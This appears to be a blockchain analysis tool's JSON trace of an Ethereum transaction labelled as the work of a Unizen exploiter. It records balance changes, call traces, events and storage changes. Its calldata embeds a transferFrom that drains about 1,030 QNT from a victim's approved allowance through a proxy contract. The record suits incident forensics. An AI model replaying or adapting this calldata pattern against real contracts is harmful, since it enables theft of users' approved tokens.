{
    "balance_change": {
        "balanceChanges": [
            {
                "account": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                "assets": [
                    {
                        "address": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                        "amount": "0.000000000000000001",
                        "iconUrl": "https://assets.blocksec.com/image/1663669189317-3.png",
                        "isERC1155": false,
                        "isERC721": false,
                        "sign": false,
                        "value": "0.0000000000000038916199999999998907"
                    },
                    {
                        "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                        "amount": "1,030.407674065956519468",
                        "iconUrl": "https://assets.blocksec.com/icon/2517ae4798f8af07582abbcc7e22fbabe148d0b4c36e1004952431a198138ad8.png",
                        "isERC1155": false,
                        "isERC721": false,
                        "sign": true,
                        "value": "127986.93718753999355"
                    }
                ]
            },
            {
                "account": "0x52e81e783c31af343dfd01084f35decbced9fc18",
                "assets": [
                    {
                        "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                        "amount": "1,030.407674065956519468",
                        "iconUrl": "https://assets.blocksec.com/icon/2517ae4798f8af07582abbcc7e22fbabe148d0b4c36e1004952431a198138ad8.png",
                        "isERC1155": false,
                        "isERC721": false,
                        "sign": false,
                        "value": "127986.93718753999355"
                    }
                ]
            },
            {
                "account": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                "assets": [
                    {
                        "address": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                        "amount": "0.000000000000000001",
                        "iconUrl": "https://assets.blocksec.com/image/1663669189317-3.png",
                        "isERC1155": false,
                        "isERC721": false,
                        "sign": true,
                        "value": "0.0000000000000038916199999999998907"
                    }
                ]
            }
        ]
    },
    "profile": {
        "basic_info": {
            "baseFee": "71.005105527",
            "blockNumber": 19393181,
            "callData": "0x8b651f790000000000000000000000004a220e6096b25eadb88358cb44068a324825467523b872dd00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac000000000000000000000000000000000000000000000037dbc7703aa9d23e2d00000000000000000000000000000000000000000000000000000000",
            "debugEnable": true,
            "errorInfo": "",
            "eventCount": 3,
            "feeRecipient": "0x95222290dd7278aa3ddd389cc1e1d165cc4bafe5",
            "formatValue": "0",
            "gasLimit": 488060,
            "gasPrice": "71.046042786",
            "gasUsed": 107038,
            "intTxnCount": 6,
            "internalRevert": false,
            "internalRevertMessage": "",
            "isContractCreation": false,
            "isFlashloan": false,
            "maxFee": "126.703980171",
            "nonce": 19,
            "overwritedBlockNumber": -1,
            "priorityFee": "0.040937259",
            "receiver": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
            "revertMessage": "",
            "sender": "0xc596523b77ceb9567279b572c653ecf4ba763cb7",
            "simulationEnable": true,
            "sourceTxnHash": "0x871cbbf381295e1c1f9014e036d2a6e860ad7571fdee03a10a40be6a905fc499",
            "status": true,
            "timestamp": "2024-03-08T21:43:11Z",
            "transactionFee": "0.007604626327727868",
            "txnHash": "0x871cbbf381295e1c1f9014e036d2a6e860ad7571fdee03a10a40be6a905fc499",
            "txnIndex": 122,
            "type": 2,
            "value": "0"
        },
        "fund_flow": [
            {
                "amount": "0.000000000000000001",
                "from": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                "id": 1,
                "isERC1155": false,
                "isERC721": false,
                "isReverted": false,
                "order": 1,
                "to": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                "token": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee"
            },
            {
                "amount": "1,030.407674065956519468",
                "from": "0x52e81e783c31af343dfd01084f35decbced9fc18",
                "id": 2,
                "isERC1155": false,
                "isERC721": false,
                "isReverted": false,
                "order": 2,
                "to": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                "token": "0x4a220e6096b25eadb88358cb44068a3248254675"
            },
            {
                "amount": "1,030.407674065956519468",
                "from": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                "id": 3,
                "isERC1155": false,
                "isERC721": false,
                "isReverted": false,
                "order": 3,
                "to": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                "token": "0x4a220e6096b25eadb88358cb44068a3248254675"
            }
        ],
        "token_infos": [
            {
                "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                "decimals": 18
            },
            {
                "address": "0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2",
                "decimals": 18
            },
            {
                "address": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                "decimals": 18
            }
        ]
    },
    "address_label": {
        "labels": [
            {
                "address": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                "label": "TransparentUpgradeableProxy_d3f6_77ac"
            },
            {
                "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                "label": "Quant: QNT Token"
            },
            {
                "address": "0xc596523b77ceb9567279b572c653ecf4ba763cb7",
                "label": "Unizen_io Exploiter 2"
            },
            {
                "address": "0x0000000000000000000000000000000000000001",
                "label": "Precompiled"
            },
            {
                "address": "0x0000000000000000000000000000000000000002",
                "label": "Precompiled"
            },
            {
                "address": "0x0000000000000000000000000000000000000003",
                "label": "Precompiled"
            },
            {
                "address": "0x0000000000000000000000000000000000000004",
                "label": "Precompiled"
            },
            {
                "address": "0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee",
                "label": "Ether"
            }
        ]
    },
    "trace": {
        "accountLabels": null,
        "dataMap": {
            "-1": {
                "invocation": {
                    "address": "0xc596523b77ceb9567279b572c653ecf4ba763cb7",
                    "callData": "",
                    "decodedMethod": null,
                    "errorInfo": "",
                    "fromAddress": "",
                    "gasUsed": 0,
                    "id": -1,
                    "methodDecoded": false,
                    "operation": "",
                    "output": "",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "",
                    "status": false,
                    "value": ""
                },
                "nodeType": 0
            },
            "0": {
                "invocation": {
                    "address": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                    "callData": "0x0000000000000000000000004a220e6096b25eadb88358cb44068a324825467523b872dd00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac000000000000000000000000000000000000000000000037dbc7703aa9d23e2d00000000000000000000000000000000000000000000000000000000",
                    "decodedMethod": null,
                    "errorInfo": "",
                    "fromAddress": "0xc596523b77ceb9567279b572c653ecf4ba763cb7",
                    "gasUsed": 107038,
                    "id": 0,
                    "methodDecoded": false,
                    "operation": "CALL",
                    "output": "",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x8b651f79",
                    "status": true,
                    "value": "0"
                },
                "nodeType": 0
            },
            "1": {
                "invocation": {
                    "address": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "callData": "0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac0126600000000000000000000000000000000000000000000000000000000000000000000000000000000000000004a220e6096b25eadb88358cb44068a3248254675000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000297963e6c9965e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000753000000000000000000000000000000000000000000000000000000000000000a554e495a454e2d434c4900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000004a220e6096b25eadb88358cb44068a324825467500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac000000000000000000000000000000000000000000000037dbc7703aa9d23e2d00000000000000000000000000000000000000000000000000000000",
                    "decodedMethod": null,
                    "errorInfo": "",
                    "fromAddress": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                    "gasUsed": 75531,
                    "id": 1,
                    "methodDecoded": false,
                    "operation": "CALL",
                    "output": "",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x1ef29a02",
                    "status": true,
                    "value": "0.000000000000000001"
                },
                "nodeType": 0
            },
            "2": {
                "invocation": {
                    "address": "0xa051fc7d38baa0ace811ad9de4e9f7024e5d8a30",
                    "callData": "0x000000000000000000000000000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000000000001a000000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac0126600000000000000000000000000000000000000000000000000000000000000000000000000000000000000004a220e6096b25eadb88358cb44068a3248254675000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000297963e6c9965e0000000000000000000000000000000000000000000000000000000000000012000000000000000000000000000000000000000000000000000000000000000110000000000000000000000000000000000000000000000000000000000000753000000000000000000000000000000000000000000000000000000000000000a554e495a454e2d434c4900000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000004a220e6096b25eadb88358cb44068a324825467500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000006423b872dd00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac000000000000000000000000000000000000000000000037dbc7703aa9d23e2d00000000000000000000000000000000000000000000000000000000",
                    "decodedMethod": null,
                    "errorInfo": "",
                    "fromAddress": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "gasUsed": 68073,
                    "id": 2,
                    "methodDecoded": false,
                    "operation": "DELEGATECALL",
                    "output": "",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x1ef29a02",
                    "status": true,
                    "value": "0.000000000000000001"
                },
                "nodeType": 0
            },
            "3": {
                "invocation": {
                    "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "callData": "0x000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac",
                    "decodedMethod": {
                        "callParams": [
                            {
                                "name": "_owner",
                                "type": "address",
                                "value": "0xd3f64baa732061f8b3626ee44bab354f854877ac"
                            }
                        ],
                        "constructorArguments": "",
                        "name": "balanceOf",
                        "returnParams": [
                            {
                                "decimalAvailable": true,
                                "name": "balance",
                                "type": "uint256",
                                "value": "4,224,150,062,917,009"
                            }
                        ],
                        "signature": "balanceOf(address)"
                    },
                    "errorInfo": "",
                    "fromAddress": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "gasUsed": 2605,
                    "id": 3,
                    "methodDecoded": true,
                    "operation": "STATICCALL",
                    "output": "0x000000000000000000000000000000000000000000000000000f01d793fa6591",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x70a08231",
                    "status": true,
                    "value": "0"
                },
                "nodeType": 0
            },
            "4": {
                "invocation": {
                    "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "callData": "0x00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac000000000000000000000000000000000000000000000037dbc7703aa9d23e2d",
                    "decodedMethod": {
                        "callParams": [
                            {
                                "name": "_from",
                                "type": "address",
                                "value": "0x52e81e783c31af343dfd01084f35decbced9fc18"
                            },
                            {
                                "name": "_to",
                                "type": "address",
                                "value": "0xd3f64baa732061f8b3626ee44bab354f854877ac"
                            },
                            {
                                "decimalAvailable": true,
                                "name": "_value",
                                "type": "uint256",
                                "value": "1,030,407,674,065,956,519,469"
                            }
                        ],
                        "constructorArguments": "",
                        "name": "transferFrom",
                        "returnParams": [
                            {
                                "name": "",
                                "type": "bool",
                                "value": true
                            }
                        ],
                        "signature": "transferFrom(address,address,uint256)"
                    },
                    "errorInfo": "",
                    "fromAddress": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "gasUsed": 16857,
                    "id": 4,
                    "methodDecoded": true,
                    "operation": "CALL",
                    "output": "0x0000000000000000000000000000000000000000000000000000000000000001",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x23b872dd",
                    "status": true,
                    "value": "0"
                },
                "nodeType": 0
            },
            "5": {
                "event": {
                    "contract": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "decodedLog": {
                        "name": "Transfer",
                        "params": [
                            {
                                "name": "from",
                                "type": "address",
                                "value": "0x52e81e783c31af343dfd01084f35decbced9fc18"
                            },
                            {
                                "name": "to",
                                "type": "address",
                                "value": "0xd3f64baa732061f8b3626ee44bab354f854877ac"
                            },
                            {
                                "decimalAvailable": true,
                                "name": "value",
                                "type": "uint256",
                                "value": "1,030,407,674,065,956,519,469"
                            }
                        ],
                        "signature": "Transfer(address,address,uint256)"
                    },
                    "id": 5,
                    "logData": "0x000000000000000000000000000000000000000000000037dbc7703aa9d23e2d",
                    "logDecoded": true,
                    "operation": "EVENT",
                    "revert": false,
                    "status": true,
                    "topics": [
                        "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
                        "0x00000000000000000000000052e81e783c31af343dfd01084f35decbced9fc18",
                        "0x000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac"
                    ]
                },
                "nodeType": 1
            },
            "6": {
                "invocation": {
                    "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "callData": "0x000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac",
                    "decodedMethod": {
                        "callParams": [
                            {
                                "name": "_owner",
                                "type": "address",
                                "value": "0xd3f64baa732061f8b3626ee44bab354f854877ac"
                            }
                        ],
                        "constructorArguments": "",
                        "name": "balanceOf",
                        "returnParams": [
                            {
                                "decimalAvailable": true,
                                "name": "balance",
                                "type": "uint256",
                                "value": "1,030,411,898,216,019,436,478"
                            }
                        ],
                        "signature": "balanceOf(address)"
                    },
                    "errorInfo": "",
                    "fromAddress": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "gasUsed": 605,
                    "id": 6,
                    "methodDecoded": true,
                    "operation": "STATICCALL",
                    "output": "0x000000000000000000000000000000000000000000000037dbd672123dcca3be",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0x70a08231",
                    "status": true,
                    "value": "0"
                },
                "nodeType": 0
            },
            "7": {
                "invocation": {
                    "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "callData": "0x00000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac01266000000000000000000000000000000000000000000000037dbc7703aa9d23e2d",
                    "decodedMethod": {
                        "callParams": [
                            {
                                "name": "_to",
                                "type": "address",
                                "value": "0x90a7482dd7fa28865f440ec0c3b783775ac01266"
                            },
                            {
                                "decimalAvailable": true,
                                "name": "_value",
                                "type": "uint256",
                                "value": "1,030,407,674,065,956,519,469"
                            }
                        ],
                        "constructorArguments": "",
                        "name": "transfer",
                        "returnParams": [
                            {
                                "name": "",
                                "type": "bool",
                                "value": true
                            }
                        ],
                        "signature": "transfer(address,uint256)"
                    },
                    "errorInfo": "",
                    "fromAddress": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "gasUsed": 25513,
                    "id": 7,
                    "methodDecoded": true,
                    "operation": "CALL",
                    "output": "0x0000000000000000000000000000000000000000000000000000000000000001",
                    "revert": false,
                    "revertMessage": "",
                    "selector": "0xa9059cbb",
                    "status": true,
                    "value": "0"
                },
                "nodeType": 0
            },
            "8": {
                "event": {
                    "contract": "0x4a220e6096b25eadb88358cb44068a3248254675",
                    "decodedLog": {
                        "name": "Transfer",
                        "params": [
                            {
                                "name": "from",
                                "type": "address",
                                "value": "0xd3f64baa732061f8b3626ee44bab354f854877ac"
                            },
                            {
                                "name": "to",
                                "type": "address",
                                "value": "0x90a7482dd7fa28865f440ec0c3b783775ac01266"
                            },
                            {
                                "decimalAvailable": true,
                                "name": "value",
                                "type": "uint256",
                                "value": "1,030,407,674,065,956,519,469"
                            }
                        ],
                        "signature": "Transfer(address,address,uint256)"
                    },
                    "id": 8,
                    "logData": "0x000000000000000000000000000000000000000000000037dbc7703aa9d23e2d",
                    "logDecoded": true,
                    "operation": "EVENT",
                    "revert": false,
                    "status": true,
                    "topics": [
                        "0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef",
                        "0x000000000000000000000000d3f64baa732061f8b3626ee44bab354f854877ac",
                        "0x00000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac01266"
                    ]
                },
                "nodeType": 1
            },
            "9": {
                "event": {
                    "contract": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                    "decodedLog": {
                        "name": "Swapped",
                        "params": [
                            {
                                "name": "amountIn",
                                "type": "uint256",
                                "value": "0"
                            },
                            {
                                "name": "amountOut",
                                "type": "uint256",
                                "value": "1,030,407,674,065,956,519,469"
                            },
                            {
                                "name": "srcToken",
                                "type": "address",
                                "value": "0x0000000000000000000000000000000000000000"
                            },
                            {
                                "name": "dstToken",
                                "type": "address",
                                "value": "0x4a220e6096b25eadb88358cb44068a3248254675"
                            },
                            {
                                "name": "receiver",
                                "type": "address",
                                "value": "0x90a7482dd7fa28865f440ec0c3b783775ac01266"
                            },
                            {
                                "name": "sender",
                                "type": "address",
                                "value": "0x90a7482dd7fa28865f440ec0c3b783775ac01266"
                            },
                            {
                                "name": "apiId",
                                "type": "uint16",
                                "value": "17"
                            }
                        ],
                        "signature": "Swapped(uint256,uint256,address,address,address,address,uint16)"
                    },
                    "id": 9,
                    "logData": "0x0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000037dbc7703aa9d23e2d00000000000000000000000000000000000000000000000000000000000000000000000000000000000000004a220e6096b25eadb88358cb44068a324825467500000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac0126600000000000000000000000090a7482dd7fa28865f440ec0c3b783775ac012660000000000000000000000000000000000000000000000000000000000000011",
                    "logDecoded": true,
                    "operation": "EVENT",
                    "revert": false,
                    "status": true,
                    "topics": [
                        "0xe3aecd3d46b48cc4869cac1e9bad367d8ebe45dd01d231fe7d442d3f85ca7565"
                    ]
                },
                "nodeType": 1
            }
        },
        "gasFlame": [
            {
                "children": [
                    {
                        "children": [
                            {
                                "children": [],
                                "depth": 0,
                                "name": "Initial Gas",
                                "value": 22580
                            },
                            {
                                "children": [
                                    {
                                        "children": [
                                            {
                                                "children": [
                                                    {
                                                        "children": [],
                                                        "depth": 3,
                                                        "name": "balanceOf",
                                                        "value": 2605
                                                    },
                                                    {
                                                        "children": [],
                                                        "depth": 3,
                                                        "name": "transferFrom",
                                                        "value": 16857
                                                    },
                                                    {
                                                        "children": [],
                                                        "depth": 3,
                                                        "name": "balanceOf",
                                                        "value": 605
                                                    },
                                                    {
                                                        "children": [],
                                                        "depth": 3,
                                                        "name": "transfer",
                                                        "value": 25513
                                                    }
                                                ],
                                                "depth": 2,
                                                "name": "0x1ef29a02",
                                                "value": 68073
                                            }
                                        ],
                                        "depth": 1,
                                        "name": "0x1ef29a02",
                                        "value": 75531
                                    }
                                ],
                                "depth": 0,
                                "name": "Executed Gas",
                                "value": 94858
                            }
                        ],
                        "depth": -1,
                        "name": "Actual Gas Used",
                        "value": 107038
                    },
                    {
                        "children": [],
                        "depth": -1,
                        "name": "Refunded Gas",
                        "value": 10400
                    }
                ],
                "depth": -2,
                "name": "Total Gas",
                "value": 117438
            }
        ],
        "isConfirmed": true,
        "mainTrace": [
            {
                "children": [
                    {
                        "children": [
                            {
                                "children": [
                                    {
                                        "children": [
                                            {
                                                "children": [],
                                                "depth": 3,
                                                "id": 3,
                                                "order": 3
                                            },
                                            {
                                                "children": [
                                                    {
                                                        "children": [],
                                                        "depth": 4,
                                                        "id": 5,
                                                        "order": 5
                                                    }
                                                ],
                                                "depth": 3,
                                                "id": 4,
                                                "order": 4
                                            },
                                            {
                                                "children": [],
                                                "depth": 3,
                                                "id": 6,
                                                "order": 6
                                            },
                                            {
                                                "children": [
                                                    {
                                                        "children": [],
                                                        "depth": 4,
                                                        "id": 8,
                                                        "order": 8
                                                    }
                                                ],
                                                "depth": 3,
                                                "id": 7,
                                                "order": 7
                                            },
                                            {
                                                "children": [],
                                                "depth": 3,
                                                "id": 9,
                                                "order": 9
                                            }
                                        ],
                                        "depth": 2,
                                        "id": 2,
                                        "order": 2
                                    }
                                ],
                                "depth": 1,
                                "id": 1,
                                "order": 1
                            }
                        ],
                        "depth": 0,
                        "id": 0,
                        "order": 0
                    }
                ],
                "depth": -1,
                "id": -1,
                "order": -1
            }
        ],
        "mainTraceNodeCount": 10,
        "parentIdMap": {
            "0": -1,
            "1": 0,
            "2": 1,
            "3": 2,
            "4": 2,
            "5": 4,
            "6": 2,
            "7": 2,
            "8": 7,
            "9": 2
        },
        "tidyTrace": [
            {
                "children": [
                    {
                        "children": [
                            {
                                "children": [
                                    {
                                        "children": [
                                            {
                                                "children": [
                                                    {
                                                        "children": [],
                                                        "depth": 4,
                                                        "id": 5,
                                                        "order": 5
                                                    }
                                                ],
                                                "depth": 3,
                                                "id": 4,
                                                "order": 4
                                            },
                                            {
                                                "children": [
                                                    {
                                                        "children": [],
                                                        "depth": 4,
                                                        "id": 8,
                                                        "order": 8
                                                    }
                                                ],
                                                "depth": 3,
                                                "id": 7,
                                                "order": 7
                                            },
                                            {
                                                "children": [],
                                                "depth": 3,
                                                "id": 9,
                                                "order": 9
                                            }
                                        ],
                                        "depth": 2,
                                        "id": 2,
                                        "order": 2
                                    }
                                ],
                                "depth": 1,
                                "id": 1,
                                "order": 1
                            }
                        ],
                        "depth": 0,
                        "id": 0,
                        "order": 0
                    }
                ],
                "depth": -1,
                "id": -1,
                "order": -1
            }
        ],
        "tidyTraceNodeCount": 8
    },
    "state_change": {
        "stateChanges": [
            {
                "address": "0x4a220e6096b25eadb88358cb44068a3248254675",
                "erc": "ERC-20",
                "slots": [
                    {
                        "current": "0x000000000000000000000000000000000000000000000037dbc7703aa9d23e2d",
                        "key": "0x5b6a4051c7104ad3a5793418431de9996024ced5fcc87764a53aeef75e52b783",
                        "prev": "0x0000000000000000000000000000000000000000000000000000000000000000"
                    },
                    {
                        "current": "0xffffffffffffffffffffffffffffffffffffffffffffffad692cf1c01efad714",
                        "key": "0x6657c6a1053a27713bb626450fa17b3a733b0d26197f0546794865aff624c07a",
                        "prev": "0xffffffffffffffffffffffffffffffffffffffffffffffe544f461fac8cd1541"
                    },
                    {
                        "current": "0x0000000000000000000000000000000000000000000000000000000000000000",
                        "key": "0x49f9f4fefa4dd3dfc75a2b8ebb7874a3f2b9a95b5ce41232cdd6ff6269879d0b",
                        "prev": "0x000000000000000000000000000000000000000000000037dbc7703aa9d23e2d"
                    }
                ],
                "storageVariables": [
                    {
                        "name": "allowed",
                        "type": "mapping(address => mapping(address => uint256))",
                        "value": {
                            "pairs": [
                                {
                                    "key": "0x52e81e783c31af343dfd01084f35decbced9fc18",
                                    "value": {
                                        "pairs": [
                                            {
                                                "key": "0xd3f64baa732061f8b3626ee44bab354f854877ac",
                                                "value": {
                                                    "current": "115792089237316195423570985008687907853269984665640564037934082947875650328340",
                                                    "prev": "115792089237316195423570985008687907853269984665640564038964490621941606847809",
                                                    "typeTag": 1
                                                }
                                            }
                                        ],
                                        "typeTag": 4
                                    }
                                }
                            ],
                            "typeTag": 4
                        }
                    },
                    {
                        "name": "balances",
                        "type": "mapping(address => uint256)",
                        "value": {
                            "pairs": [
                                {
                                    "key": "0x52e81e783c31af343dfd01084f35decbced9fc18",
                                    "value": {
                                        "current": "0",
                                        "prev": "1030407674065956519469",
                                        "typeTag": 1
                                    }
                                },
                                {
                                    "key": "0x90a7482dd7fa28865f440ec0c3b783775ac01266",
                                    "value": {
                                        "current": "1030407674065956519469",
                                        "prev": "0",
                                        "typeTag": 1
                                    }
                                }
                            ],
                            "typeTag": 4
                        }
                    }
                ]
            }
        ]
    }
}